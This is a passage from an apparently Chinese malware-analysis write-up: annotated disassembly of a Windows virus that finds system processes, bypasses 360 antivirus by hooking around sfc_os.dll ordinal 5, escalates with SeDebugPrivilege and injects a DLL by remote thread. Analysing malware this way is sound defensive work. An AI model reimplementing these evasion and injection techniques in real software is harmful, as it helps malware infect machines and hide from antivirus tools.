00404A44  |.  C645 F8 6D             mov     byte ptr [ebp-8], 6D
00404A48  |.  C645 F9 65             mov     byte ptr [ebp-7], 65
00404A4C  |.  C645 FA 2E             mov     byte ptr [ebp-6], 2E
00404A50  |.  C645 FB 65             mov     byte ptr [ebp-5], 65
00404A54  |.  C645 FC 78             mov     byte ptr [ebp-4], 78
00404A58  |.  C645 FD 65             mov     byte ptr [ebp-3], 65
00404A5C  |.  885D FE                mov     byte ptr [ebp-2], bl
00404A5F  |.  C645 E8 63             mov     byte ptr [ebp-18], 63                          ;  ctfmon.exe
00404A63  |.  C645 E9 74             mov     byte ptr [ebp-17], 74
00404A67  |.  C645 EA 66             mov     byte ptr [ebp-16], 66
00404A6B  |.  C645 EB 6D             mov     byte ptr [ebp-15], 6D
00404A6F  |.  C645 EC 6F             mov     byte ptr [ebp-14], 6F
00404A73  |.  C645 ED 6E             mov     byte ptr [ebp-13], 6E
00404A77  |.  C645 EE 2E             mov     byte ptr [ebp-12], 2E
00404A7B  |.  C645 EF 65             mov     byte ptr [ebp-11], 65
00404A7F  |.  C645 F0 78             mov     byte ptr [ebp-10], 78
00404A83  |.  C645 F1 65             mov     byte ptr [ebp-F], 65
00404A87  |.  885D F2                mov     byte ptr [ebp-E], bl
00404A8A  |.  C645 CC 65             mov     byte ptr [ebp-34], 65                          ;  explorer.exe
00404A8E  |.  C645 CD 78             mov     byte ptr [ebp-33], 78
00404A92  |.  C645 CE 70             mov     byte ptr [ebp-32], 70
00404A96  |.  C645 CF 6C             mov     byte ptr [ebp-31], 6C
00404A9A  |.  C645 D0 6F             mov     byte ptr [ebp-30], 6F
00404A9E  |.  C645 D1 72             mov     byte ptr [ebp-2F], 72
00404AA2  |.  C645 D2 65             mov     byte ptr [ebp-2E], 65
00404AA6  |.  C645 D3 72             mov     byte ptr [ebp-2D], 72
00404AAA  |.  C645 D4 2E             mov     byte ptr [ebp-2C], 2E
00404AAE  |.  C645 D5 65             mov     byte ptr [ebp-2B], 65
00404AB2  |.  C645 D6 78             mov     byte ptr [ebp-2A], 78
00404AB6  |.  C645 D7 65             mov     byte ptr [ebp-29], 65
00404ABA  |.  885D D8                mov     byte ptr [ebp-28], bl
00404ABD  |.  C645 BC 49             mov     byte ptr [ebp-44], 49                          ;  IEXPLORER.EXE
00404AC1  |.  C645 BD 45             mov     byte ptr [ebp-43], 45
00404AC5  |.  C645 BE 58             mov     byte ptr [ebp-42], 58
00404AC9  |.  C645 BF 50             mov     byte ptr [ebp-41], 50
00404ACD  |.  C645 C0 4C             mov     byte ptr [ebp-40], 4C
00404AD1  |.  C645 C1 4F             mov     byte ptr [ebp-3F], 4F
00404AD5  |.  C645 C2 52             mov     byte ptr [ebp-3E], 52
00404AD9  |.  C645 C3 45             mov     byte ptr [ebp-3D], 45
00404ADD  |.  C645 C4 52             mov     byte ptr [ebp-3C], 52
00404AE1  |.  C645 C5 2E             mov     byte ptr [ebp-3B], 2E
00404AE5  |.  C645 C6 45             mov     byte ptr [ebp-3A], 45
00404AE9  |.  C645 C7 58             mov     byte ptr [ebp-39], 58
00404AED  |.  C645 C8 45             mov     byte ptr [ebp-38], 45
00404AF1  |.  885D C9                mov     byte ptr [ebp-37], bl
00404AF4  |.  E8 07C5FFFF            call    00401000                                     ;  找 conime.exe 并返回 PID
00404AF9  |.  3BC3                   cmp     eax, ebx
00404AFB  |.  59                     pop     ecx
00404AFC  |.  75 2E                  jnz     short 00404B2C
00404AFE  |.  8D45 BC                lea     eax, dword ptr [ebp-44]                      ;  IEXPLORER.EXE
00404B01  |.  50                     push    eax
00404B02  |.  E8 F9C4FFFF            call    00401000
00404B07  |.  3BC3                   cmp     eax, ebx
00404B09  |.  59                     pop     ecx
00404B0A  |.  75 20                  jnz     short 00404B2C
00404B0C  |.  8D45 E8                lea     eax, dword ptr [ebp-18]                      ;  ctfmon.exe
00404B0F  |.  50                     push    eax
00404B10  |.  E8 EBC4FFFF            call    00401000
00404B15  |.  3BC3                   cmp     eax, ebx
00404B17  |.  59                     pop     ecx
00404B18  |.  75 12                  jnz     short 00404B2C
00404B1A  |.  8D45 CC                lea     eax, dword ptr [ebp-34]                      ;  explorer.exe
00404B1D  |.  50                     push    eax
00404B1E  |.  E8 DDC4FFFF            call    00401000
00404B23  |.  3BC3                   cmp     eax, ebx
00404B25  |.  59                     pop     ecx
00404B26  |.  75 04                  jnz     short 00404B2C
00404B28  |>  B0 01                  mov     al, 1
00404B2A  |.  EB 18                  jmp     short 00404B44
00404B2C  |>  FF75 10                push    dword ptr [ebp+10]                           ;  1
00404B2F  |.  FF75 0C                push    dword ptr [ebp+C]                            ;  系统目录\\DllCache\\d3d8thk.dll.****（4 个随即大写字符）
00404B32  |.  FF75 08                push    dword ptr [ebp+8]                            ;  系统目录\\DllCache\\d3d8thk.dll
00404B35  |.  50                     push    eax                                          ;  找到的进程 ID
00404B36  |.  E8 94FAFFFF            call    004045CF                                     ;  注入目标进程，执行指定代码
00404B3B  |.  83C4 10                add     esp, 10
00404B3E  |.  F6D8                   neg     al
00404B40  |.  1AC0                   sbb     al, al
00404B42  |.  FEC0                   inc     al
00404B44  |>  5B                     pop     ebx
00404B45  |.  C9                     leave
00404B46  \.  C3                     ret
```

## 第六段

此段接第五段，详解该毒如何规避 `360` 检测，病毒是新鲜出炉的，但我不敢保证这个方法能过新版 `360`

代码:



```assembly
00404457   $  55                        push    ebp                       ;  此段函数是该病毒专门用来对付 360 的~ 把 sfc_os.dll 的 5 号函数的前 5 位复制到一个堆中，然后再在后面添加 jmp 到 5 号函数的第 6 位，从而躲避 360 的检测
00404458   .  8BEC                      mov     ebp, esp
0040445A   .  83EC 30                  sub     esp, 30
0040445D   .  53                       push    ebx
0040445E   .  56                       push    esi
0040445F   .  57                       push    edi
00404460   .  C645 D0 53               mov     byte ptr [ebp-30], 53                     ;  SeDebugPrivilege
00404464   .  C645 D1 65               mov     byte ptr [ebp-2F], 65
00404468   .  C645 D2 44               mov     byte ptr [ebp-2E], 44
0040446C   .  C645 D3 65               mov     byte ptr [ebp-2D], 65
00404470   .  C645 D4 62               mov     byte ptr [ebp-2C], 62
00404474   .  C645 D5 75               mov     byte ptr [ebp-2B], 75
00404478   .  C645 D6 67               mov     byte ptr [ebp-2A], 67
0040447C   .  C645 D7 50               mov     byte ptr [ebp-29], 50
00404480   .  C645 D8 72               mov     byte ptr [ebp-28], 72
00404484   .  C645 D9 69               mov     byte ptr [ebp-27], 69
00404488   .  C645 DA 76               mov     byte ptr [ebp-26], 76
0040448C   .  C645 DB 69               mov     byte ptr [ebp-25], 69
00404490   .  C645 DC 6C               mov     byte ptr [ebp-24], 6C
00404494   .  C645 DD 65               mov     byte ptr [ebp-23], 65
00404498   .  C645 DE 67               mov     byte ptr [ebp-22], 67
0040449C   .  C645 DF 65               mov     byte ptr [ebp-21], 65
004044A0   .  8065 E0 00               and     byte ptr [ebp-20], 0
004044A4   .  6A 01                    push    1
004044A6   .  8D45 D0                  lea     eax, dword ptr [ebp-30]                  ;  SeDebugPrivilege
004044A9   .  50                       push    eax
004044AA   .  E8 9ECEFFFF              call    0040134D                                 ;  提权
004044AF   .  59                       pop     ecx
004044B0   .  59                       pop     ecx
004044B1   .  C645 E4 73               mov     byte ptr [ebp-1C], 73                     ;  sfc_os.dll
004044B5   .  C645 E5 66               mov     byte ptr [ebp-1B], 66
004044B9   .  C645 E6 63               mov     byte ptr [ebp-1A], 63
004044BD   .  C645 E7 5F               mov     byte ptr [ebp-19], 5F
004044C1   .  C645 E8 6F               mov     byte ptr [ebp-18], 6F
004044C5   .  C645 E9 73               mov     byte ptr [ebp-17], 73
004044C9   .  C645 EA 2E               mov     byte ptr [ebp-16], 2E
004044CD   .  C645 EB 64               mov     byte ptr [ebp-15], 64
004044D1   .  C645 EC 6C               mov     byte ptr [ebp-14], 6C
004044D5   .  C645 ED 6C               mov     byte ptr [ebp-13], 6C
004044D9   .  8065 EE 00               and     byte ptr [ebp-12], 0
004044DD   .  68 04010000              push    104                                     ;  /n = 104 (260.)
004044E2   .  6A 00                    push    0                                       ;  |c = 00
004044E4   .  68 5C744000              push    0040745C                                 ;  |s = unpacked.0040745C
004044E9   .  E8 1A0E0000              call    <jmp.&MSVCRT.memset>                    ;  \memset
004044EE   .  83C4 0C                  add     esp, 0C
004044F1   .  68 82000000              push    82                                      ;  /WideBufSize = 82 (130.)
004044F6   .  68 5C744000              push    0040745C                                 ;  |WideCharBuf = unpacked.0040745C
004044FB   .  FF75 08                 push    dword ptr [ebp+8]                        ;  |/"系统目录\\system\\d3d8thk.dll"
004044FE   .  FF15 48604000            call    dword ptr [<&kernel32.lstrlen>]         ;  |\lstrlenA
00404504   .  50                       push    eax                                     ;  |StringSize
00404505   .  FF75 08                 push    dword ptr [ebp+8]                        ;  |StringToMap
00404508   .  6A 00                    push    0                                       ;  |Options = 0
0040450A   .  6A 00                    push    0                                       ;  |CodePage = CP_ACP
0040450C   .  FF15 08604000            call    dword ptr [<&kernel32.MultiByteToWideChar>] ;  \MultiByteToWideChar
00404512   .  8D45 E4                 lea     eax, dword ptr [ebp-1C]                 ;  sfc_os.dll
00404515   .  50                       push    eax                                     ;  /FileName
00404516   .  FF15 00604000            call    dword ptr [<&kernel32.LoadLibraryA>]    ;  \LoadLibraryA
0040451C   .  8945 F8                 mov     dword ptr [ebp-8], eax
0040451F   .  837D F8 00              cmp     dword ptr [ebp-8], 0
00404523   .  75 07                    jnz     short 0040452C
00404525   .  33C0                    xor     eax, eax
00404527   .  E9 9E000000              jmp     004045CA
0040452C   >  8365 F0 00               and     dword ptr [ebp-10], 0
00404530   .  6A 05                    push    5
00404532   .  FF75 F8                 push    dword ptr [ebp-8]
00404535   .  E8 F7D3FFFF              call    00401931                                 ;  GetProcAddress 获取 5 号函数指针
0040453A   .  59                       pop     ecx
0040453B   .  59                       pop     ecx
0040453C   .  8945 F4                 mov     dword ptr [ebp-C], eax
0040453F   .  8B45 F4                 mov     eax, dword ptr [ebp-C]
00404542   .  8945 FC                 mov     dword ptr [ebp-4], eax
00404545   .  0FB605 58744000          movzx   eax, byte ptr [407458]
0040454C   .  83E0 01                 and     eax, 1
0040454F   .  85C0                   test    eax, eax
00404551   .  75 22                    jnz     short 00404575
00404553   .  A0 58744000             mov     al, byte ptr [407458]
00404558   .  0C 01                   or      al, 1
0040455A   .  A2 58744000             mov     byte ptr [407458], al
0040455F   .  6A 0A                    push    0A                                      ;  /dwBytes = A (10.)
00404561   .  6A 08                    push    8                                       ;  |dwFlags = HEAP_ZERO_MEMORY
00404563   .  FF15 44604000            call    dword ptr [<&kernel32.GetProcessHeap>]  ;  |\[GetProcessHeap
00404569   .  50                       push    eax                                     ;  |hHeap
0040456A   .  FF15 40604000            call    dword ptr [<&kernel32.HeapAlloc>]       ;  \RtlAllocateHeap
00404570   .  A3 54744000             mov     dword ptr [407454], eax                 ;  在堆中分配的 10 个字节的空间，内容为 0
00404575   >  6A 05                    push    5                                       ;  /n = 5
00404577   .  FF75 FC                 push    dword ptr [ebp-4]                       ;  |src
0040457A   .  FF35 54744000           push    dword ptr [407454]                      ;  |dest = NULL
00404580   .  E8 7D0D0000              call    <jmp.&MSVCRT.memcpy>                   ;  \memcpy 复制 5 号函数的前 5 个字节内容到刚分配的堆空间中
00404585   .  83C4 0C                 add     esp, 0C
00404588   .  A1 54744000             mov     eax, dword ptr [407454]
0040458D   .  C640 05 E9              mov     byte ptr [eax+5], 0E9                    ;  修改堆空间的第六个字节内容为 0x0E9
00404591   .  8B45 FC                 mov     eax, dword ptr [ebp-4]                  ;  eax=5 号函数指针
00404594   .  2B05 54744000           sub     eax, dword ptr [407454]                  ;  这两句是计算跳转地址
0040459A   .  83E8 05                 sub     eax, 5
0040459D   .  8B0D 54744000           mov     ecx, dword ptr [407454]                  ;  ecx=分配的堆指针
004045A3   .  8941 06                 mov     dword ptr [ecx+6], eax                   ;  堆的最后四个字节内容
004045A6   .  6A FF                   push    -1
004045A8   .  68 5C744000              push    0040745C                                 ;  "系统目录\\system\\d3d8thk.dll"
004045AD   .  6A 00                    push    0
004045AF   .  E8 00000000              call    004045B4                                 ;  下面四句计算返回地址，并压入栈
004045B4   $  58                       pop     eax                                     ;  eax=0x4045b4
004045B5   .  83C0 0B                 add     eax, 0B
004045B8   .  50                       push    eax
004045B9   .  FF25 54744000           jmp     dword ptr [407454]                      ;  跳转到堆，执行指令
004045BF   .  FF75 F8                 push    dword ptr [ebp-8]                       ;  /hLibModule
004045C2   .  FF15 3C604000            call    dword ptr [<&kernel32.FreeLibrary>]     ;  \FreeLibrary
004045C8   .  33C0                    xor     eax, eax                                 ;  返回 0
004045CA   >  5F                       pop     edi
004045CB   .  5E                       pop     esi
004045CC   .  5B                       pop     ebx
004045CD   .  C9                       leave
004045CE   .  C3                       retn
```



## 第七段

远程线程注入

代码:



```
004045CF   /$  55                   push    ebp                                             ;  成功注入目标返回 1 失败返回 0
004045D0   |.  8BEC                mov     ebp, esp
004045D2   |.  81EC A4090000       sub     esp, 9A4
004045D8   |.  53                   push    ebx
004045D9   |.  33DB                xor     ebx, ebx                                        ;  ebx=0
004045DB   |.  395D 08             cmp     dword ptr [ebp+8], ebx
004045DE   |.  56                   push    esi
004045DF   |.  57                   push    edi
004045E0   |.  0F84 EF030000       je      004049D5
004045E6   |.  FF75 0C             push    dword ptr [ebp+C]                               ;  系统目录\\DllCache\\d3d8thk.dll
004045E9   |.  E8 41D1FFFF        call    0040172F                                        ;  strlen
004045EE   |.  85C0                test    eax, eax
004045F0   |.  59                   pop     ecx
004045F1   |.  0F84 DE030000       je      004049D5
004045F7   |.  FF75 10             push    dword ptr [ebp+10]                              ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
004045FA   |.  E8 30D1FFFF        call    0040172F                                        ;  strlen
004045FF   |.  85C0                test    eax, eax
00404601   |.  59                   pop     ecx
00404602   |.  0F84 CD030000       je      004049D5
00404608   |.  8D45 D4             lea     eax, dword ptr [ebp-2C]
0040460B   |.  C645 D4 4B          mov     byte ptr [ebp-2C], 4B
0040460F   |.  50                   push    eax                                           ; /FileName
0040473C   |.  885D AE             mov     byte ptr [ebp-52], bl                           ; |
0040473F   |.  FF15 00604000       call    dword ptr [<&kernel32.LoadLibraryA>]            ; \\LoadLibraryA
00404745   |.  8BF8                mov     edi, eax
00404747   |.  8D45 F4             lea     eax, dword ptr [ebp-C]                         ;  OpenProcess
0040474A   |.  50                   push    eax
0040474B   |.  57                   push    edi
0040474C   |.  E8 E0D1FFFF        call    00401931                                        ;  GetProcAddress OpenProcess
00404751   |.  8985 74FFFFFF       mov     dword ptr [ebp-8C], eax
00404757   |.  8D45 C4             lea     eax, dword ptr [ebp-3C]
0040475A   |.  50                   push    eax                                           ;  VirtualAllocEx
0040475B   |.  57                   push    edi
0040475C   |.  E8 D0D1FFFF        call    00401931                                        ;  GetProcAddress  VirtualAllocEx
00404761   |.  8985 70FFFFFF       mov     dword ptr [ebp-90], eax
00404767   |.  8D45 88             lea     eax, dword ptr [ebp-78]                         ;  WriteProcessMemory
0040476A   |.  50                   push    eax
0040476B   |.  57                   push    edi
0040476C   |.  E8 C0D1FFFF        call    00401931                                        ;  GetProcAddress WriteProcessMemory
00404771   |.  8945 80             mov     dword ptr [ebp-80], eax
00404774   |.  8D45 9C             lea     eax, dword ptr [ebp-64]                         ;  CreateRemoteThread
00404777   |.  50                   push    eax
00404778   |.  57                   push    edi
00404779   |.  E8 B3D1FFFF        call    00401931                                        ;  GetProcAddress CreateRemoteThread
0040477E   |.  8985 78FFFFFF       mov     dword ptr [ebp-88], eax
00404784   |.  8D45 E4             lea     eax, dword ptr [ebp-1C]
00404787   |.  50                   push    eax
00404788   |.  57                   push    edi
00404789   |.  C645 E4 43          mov     byte ptr [ebp-1C], 43                           ;  CloseHandle
0040478D   |.  C645 E5 6C          mov     byte ptr [ebp-1B], 6C
00404791   |.  C645 E6 6F          mov     byte ptr [ebp-1A], 6F
00404795   |.  C645 E7 73          mov     byte ptr [ebp-19], 73
00404799   |.  C645 E8 65          mov     byte ptr [ebp-18], 65
0040479D   |.  C645 E9 48          mov     byte ptr [ebp-17], 48
004047A1   |.  C645 EA 61          mov     byte ptr [ebp-16], 61
004047A5   |.  C645 EB 6E          mov     byte ptr [ebp-15], 6E
004047A9   |.  C645 EC 64          mov     byte ptr [ebp-14], 64
004047AD   |.  C645 ED 6C          mov     byte ptr [ebp-13], 6C
004047B1   |.  C645 EE 65          mov     byte ptr [ebp-12], 65
004047B5   |.  885D EF             mov     byte ptr [ebp-11], bl
004047B8   |.  E8 74D1FFFF        call    00401931                                        ;  GetProcAddress CloseHandle
004047BD   |.  6A 40               push    40
004047BF   |.  8985 7CFFFFFF       mov     dword ptr [ebp-84], eax
004047C5   |.  5E                   pop     esi                                           ;  esi = 0x40
004047C6   |.  33C0                xor     eax, eax                                        ;  eax=0
004047C8   |.  8BCE                mov     ecx, esi                                        ;  ecx=0x40
004047CA   |.  8DBD 69FDFFFF       lea     edi, dword ptr [ebp-297]
004047D0   |.  889D 68FDFFFF       mov     byte ptr [ebp-298], bl
004047D6   |.  66:899D 5CFAFFFF    mov     word ptr [ebp-5A4], bx
004047DD   |.  F3:AB               rep     stos dword ptr es:[edi]                         ;  清 0
004047DF   |.  66:AB               stos    word ptr es:[edi]
004047E1   |.  AA                   stos    byte ptr es:[edi]
004047E2   |.  B9 81000000         mov     ecx, 81
004047E7   |.  33C0                xor     eax, eax
004047E9   |.  8DBD 5EFAFFFF       lea     edi, dword ptr [ebp-5A2]
004047EF   |.  FF75 0C             push    dword ptr [ebp+C]                               ;  系统目录\\DllCache\\d3d8thk.dll
004047F2   |.  F3:AB               rep     stos dword ptr es:[edi]                         ;  清 0
004047F4   |.  66:AB               stos    word ptr es:[edi]
004047F6   |.  8D85 68FDFFFF       lea     eax, dword ptr [ebp-298]                         ;  系统目录\\DllCache\\d3d8thk.dll
004047FC   |.  50                   push    eax
004047FD   |.  E8 4CCEFFFF        call    0040164E                                        ;  strcpy
00404802   |.  8BCE                mov     ecx, esi
00404804   |.  33C0                xor     eax, eax
00404806   |.  8DBD 65FCFFFF       lea     edi, dword ptr [ebp-39B]
0040480C   |.  889D 64FCFFFF       mov     byte ptr [ebp-39C], bl
00404812   |.  F3:AB               rep     stos dword ptr es:[edi]
00404814   |.  FF75 10             push    dword ptr [ebp+10]                              ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
00404817   |.  66:AB               stos    word ptr es:[edi]
00404819   |.  AA                   stos    byte ptr es:[edi]
0040481A   |.  8D85 64FCFFFF       lea     eax, dword ptr [ebp-39C]                         ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
00404820   |.  50                   push    eax
00404821   |.  E8 28CEFFFF        call    0040164E                                        ;  strcpy
00404826   |.  8BCE                mov     ecx, esi
00404828   |.  33C0                xor     eax, eax
0040482A   |.  8DBD 6DFEFFFF       lea     edi, dword ptr [ebp-193]
00404830   |.  889D 6CFEFFFF       mov     byte ptr [ebp-194], bl
00404836   |.  F3:AB               rep     stos dword ptr es:[edi]
00404838   |.  66:AB               stos    word ptr es:[edi]
0040483A   |.  83C4 38             add     esp, 38
0040483D   |.  837D 14 02          cmp     dword ptr [ebp+14], 2
00404841   |.  AA                   stos    byte ptr es:[edi]
00404842   |.  75 05               jnz     short 00404849
00404844   |.  FF75 10             push    dword ptr [ebp+10]
00404847   |.  EB 03               jmp     short 0040484C
00404849   |>  FF75 0C             push    dword ptr [ebp+C]                               ;  系统目录\\DllCache\\d3d8thk.dll
0040484C   |>  8D85 6CFEFFFF       lea     eax, dword ptr [ebp-194]                         ;  系统目录\\DllCache\\d3d8thk.dll
00404852   |.  50                   push    eax
00404853   |.  E8 F6CDFFFF        call    0040164E                                        ;  strcpy
00404858   |.  59                   pop     ecx
00404859   |.  8D85 5CFAFFFF       lea     eax, dword ptr [ebp-5A4]                         ;  UNICODE "系统目录\\DllCache\\d3d8thk.dll"
0040485F   |.  59                   pop     ecx
00404860   |.  68 82000000         push    82                                              ; /WideBufSize = 82 (130.)
00404865   |.  50                   push    eax                                           ; |WideCharBuf
00404866   |.  8D85 6CFEFFFF       lea     eax, dword ptr [ebp-194]                         ; |系统目录\\DllCache\\d3d8thk.dll
0040486C   |.  50                   push    eax                                           ; |/String
0040486D   |.  FF15 48604000       call    dword ptr [<&kernel32.lstrlen>]                 ; |\\lstrlenA
00404873   |.  50                   push    eax                                           ; |StringSize
00404874   |.  8D85 6CFEFFFF       lea     eax, dword ptr [ebp-194]                         ; |
0040487A   |.  50                   push    eax                                           ; |StringToMap
0040487B   |.  53                   push    ebx                                           ; |Options
0040487C   |.  53                   push    ebx                                           ; |CodePage
0040487D   |.  FF15 08604000       call    dword ptr [<&kernel32.MultiByteToWideChar>]    ; \\MultiByteToWideChar
00404883   |.  B9 FF000000         mov     ecx, 0FF
00404888   |.  33C0                xor     eax, eax                                        ;  eax=0
0040488A   |.  8DBD 5DF6FFFF       lea     edi, dword ptr [ebp-9A3]
00404890   |.  889D 5CF6FFFF       mov     byte ptr [ebp-9A4], bl
00404896   |.  F3:AB               rep     stos dword ptr es:[edi]
00404898   |.  66:AB               stos    word ptr es:[edi]
0040489A   |.  AA                   stos    byte ptr es:[edi]
0040489B   |.  8D85 64FCFFFF       lea     eax, dword ptr [ebp-39C]                         ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
004048A1   |.  50                   push    eax
004048A2   |.  8D85 5CF6FFFF       lea     eax, dword ptr [ebp-9A4]                         ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
004048A8   |.  50                   push    eax
004048A9   |.  E8 A0CDFFFF        call    0040164E                                        ;  strcpy
004048AE   |.  8D85 68FDFFFF       lea     eax, dword ptr [ebp-298]                         ;  系统目录\\DllCache\\d3d8thk.dll
004048B4   |.  50                   push    eax
004048B5   |.  8D85 DCF6FFFF       lea     eax, dword ptr [ebp-924]                         ;  系统目录\\DllCache\\d3d8thk.dll
004048BB   |.  50                   push    eax
004048BC   |.  E8 8DCDFFFF        call    0040164E                                        ;  strcpy
004048C1   |.  8D85 5CFAFFFF       lea     eax, dword ptr [ebp-5A4]                         ;  UNICODE "系统目录\\DllCache\\d3d8thk.dll"
004048C7   |.  68 80000000         push    80                                              ; /n = 80 (128.)
004048CC   |.  50                   push    eax                                           ; |src
004048CD   |.  8D85 5CF7FFFF       lea     eax, dword ptr [ebp-8A4]                         ; |
004048D3   |.  50                   push    eax                                           ; |dest
004048D4   |.  E8 290A0000         call    <jmp.&MSVCRT.memcpy>                           ; \\memcpy
004048D9   |.  8D45 B0             lea     eax, dword ptr [ebp-50]
004048DC   |.  6A 01               push    1
004048DE   |.  50                   push    eax
004048DF   |.  C645 B0 53          mov     byte ptr [ebp-50], 53                           ;  SeDebugPrivilege
004048E3   |.  C645 B1 65          mov     byte ptr [ebp-4F], 65
004048E7   |.  C645 B2 44          mov     byte ptr [ebp-4E], 44
004048EB   |.  C645 B3 65          mov     byte ptr [ebp-4D], 65
004048EF   |.  C645 B4 62          mov     byte ptr [ebp-4C], 62
004048F3   |.  C645 B5 75          mov     byte ptr [ebp-4B], 75
004048F7   |.  C645 B6 67          mov     byte ptr [ebp-4A], 67
004048FB   |.  C645 B7 50          mov     byte ptr [ebp-49], 50
004048FF   |.  C645 B8 72          mov     byte ptr [ebp-48], 72
00404903   |.  C645 B9 69          mov     byte ptr [ebp-47], 69
00404907   |.  C645 BA 76          mov     byte ptr [ebp-46], 76
0040490B   |.  C645 BB 69          mov     byte ptr [ebp-45], 69
0040490F   |.  C645 BC 6C          mov     byte ptr [ebp-44], 6C
00404913   |.  C645 BD 65          mov     byte ptr [ebp-43], 65
00404917   |.  C645 BE 67          mov     byte ptr [ebp-42], 67
0040491B   |.  C645 BF 65          mov     byte ptr [ebp-41], 65
0040491F   |.  885D C0             mov     byte ptr [ebp-40], bl
00404922   |.  E8 26CAFFFF        call    0040134D                                        ;  提权操作
00404927   |.  83C4 24             add     esp, 24
0040492A   |.  FF75 08             push    dword ptr [ebp+8]                               ;  找到的进程 ID
0040492D   |.  53                   push    ebx
0040492E   |.  68 FF0F1F00         push    1F0FFF
00404933   |.  FF95 74FFFFFF       call    dword ptr [ebp-8C]                              ;  OpenProcess 打开找到的进程
00404939   |.  8BF8                mov     edi, eax
0040493B   |.  3BFB                cmp     edi, ebx
0040493D   |.  897D 10             mov     dword ptr [ebp+10], edi
00404940   |.  0F84 8F000000       je      004049D5
00404946   |.  56                   push    esi
00404947   |.  68 00100000         push    1000
0040494C   |.  68 00080000         push    800
00404951   |.  53                   push    ebx
00404952   |.  57                   push    edi
00404953   |.  FF95 70FFFFFF       call    dword ptr [ebp-90]                              ;  VirtualAllocEx 在指定的进程中分配 0x800 大小的空间
00404959   |.  8BF0                mov     esi, eax
0040495B   |.  3BF3                cmp     esi, ebx
0040495D   |.  8975 08             mov     dword ptr [ebp+8], esi
00404960   |.  74 66               je      short 004049C8
00404962   |.  8D45 F0             lea     eax, dword ptr [ebp-10]
00404965   |.  895D F0             mov     dword ptr [ebp-10], ebx
00404968   |.  50                   push    eax
00404969   |.  68 60010000         push    160
0040496E   |.  68 A0714000         push    004071A0
00404973   |.  56                   push    esi                                           ;  起始地址
00404974   |.  57                   push    edi                                           ;  指定进程
00404975   |.  FF55 80             call    dword ptr [ebp-80]                              ;  WriteProcessMemory 提取自身的命令写入目标进程地址空间
00404978   |.  85C0                test    eax, eax
0040497A   |.  74 4C               je      short 004049C8
0040497C   |.  8D4D F0             lea     ecx, dword ptr [ebp-10]
0040497F   |.  8D86 60010000       lea     eax, dword ptr [esi+160]
00404985   |.  51                   push    ecx
00404986   |.  8D8D 5CF6FFFF       lea     ecx, dword ptr [ebp-9A4]
0040498C   |.  68 00040000         push    400
00404991   |.  51                   push    ecx                                           ;  系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）
00404992   |.  50                   push    eax                                           ;  esi+160
00404993   |.  57                   push    edi                                           ;  指定进程
00404994   |.  8945 0C             mov     dword ptr [ebp+C], eax
00404997   |.  FF55 80             call    dword ptr [ebp-80]                              ;  WriteProcessMemory 把系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*（4 个随即大写字符）写入目标进程地址空间
0040499A   |.  85C0                test    eax, eax
0040499C   |.  74 2A               je      short 004049C8
0040499E   |.  895D 84             mov     dword ptr [ebp-7C], ebx
004049A1   |.  60                   pushad
004049A2   |.  61                   popad
004049A3   |.  8D45 84             lea     eax, dword ptr [ebp-7C]
004049A6   |.  33DB                xor     ebx, ebx                                        ;  ebx=0
004049A8   |.  50                   push    eax
004049A9   |.  53                   push    ebx
004049AA   |.  FF75 0C             push    dword ptr [ebp+C]                               ;  参数为"系统目录\\DllCache\\d3d8thk.dll.\*\*\*\*"（4 个随即大写字符）
004049AD   |.  FF75 08             push    dword ptr [ebp+8]                               ;  VirtualAllocEx 分配的空间 并已写好代码
004049B0   |.  53                   push    ebx
004049B1   |.  53                   push    ebx
004049B2   |.  FF75 10             push    dword ptr [ebp+10]                              ;  目标进程
004049B5   |.  FF95 78FFFFFF       call    dword ptr [ebp-88]                              ;  CreateRemoteThread
004049BB   |.  3BC3                cmp     eax, ebx
004049BD   |.  74 09               je      short 004049C8
004049BF   |.  50                   push    eax
004049C0   |.  FF95 7CFFFFFF       call    dword ptr [ebp-84]                              ;  CloseHandle
004049C6   |.  B3 01               mov     bl, 1
004049C8   |>  FF75 10             push    dword ptr [ebp+10]                              ;  目标进程
004049CB   |.  FF95 7CFFFFFF       call    dword ptr [ebp-84]                              ;  CloseHandle
004049D1   |.  8AC3                mov     al, bl
004049D3   |.  EB 02               jmp     short 004049D7
004049D5   |>  32C0                xor     al, al
004049D7   |>  5F                   pop     edi
004049D8   |.  5E                   pop     esi
004049D9   |.  5B                   pop     ebx
004049DA   |.  C9                   leave
004049DB   \\.  C3                   retn
```



## 【第八段】

注入到远程线程中的那 0x160byte 的代码清单：

因为有一个 bug，导致无法完成最后的文件转移操作，具体请看代码并比较调用函数的上下文

代码:
```

```



```
004071A0   /.   55                 push    ebp
004071A1   |.   8BEC               mov     ebp, esp
004071A3   |.   83EC 38            sub     esp, 38
004071A6   |.   53                 push    ebx
004071A7   |.   33C0               xor     eax, eax                                                   ;  eax=0
004071A9   |.   56                 push    esi
004071AA   |.   57                 push    edi
004071AB   |.   C645 D8 47         mov     byte ptr [ebp-28], 47                                      ;  GetProcAddress
004071AF   |.   C645 D9 65         mov     byte ptr [ebp-27], 65
004071B3   |.   C645 DA 74         mov     byte ptr [ebp-26], 74
004071B7   |.   C645 DB 50         mov     byte ptr [ebp-25], 50
004071BB   |.   C645 DC 72         mov     byte ptr [ebp-24], 72
004071BF   |.   C645 DD 6F         mov     byte ptr [ebp-23], 6F
004071C3   |.   C645 DE 63         mov     byte ptr [ebp-22], 63
004071C7   |.   C645 DF 41         mov     byte ptr [ebp-21], 41
004071CB   |.   C645 E0 64         mov     byte ptr [ebp-20], 64
004071CF   |.   C645 E1 64         mov     byte ptr [ebp-1F], 64
004071D3   |.   C645 E2 72         mov     byte ptr [ebp-1E], 72
004071D7   |.   C645 E3 65         mov     byte ptr [ebp-1D], 65
004071DB   |.   C645 E4 73         mov     byte ptr [ebp-1C], 73
004071DF   |.   C645 E5 73         mov     byte ptr [ebp-1B], 73
004071E3   |.   C645 E6 00         mov     byte ptr [ebp-1A], 0
004071E7   |.   8945 FC            mov     dword ptr [ebp-4], eax
004071EA   |.   8945 F8            mov     dword ptr [ebp-8], eax
004071ED   |.   60                 pushad
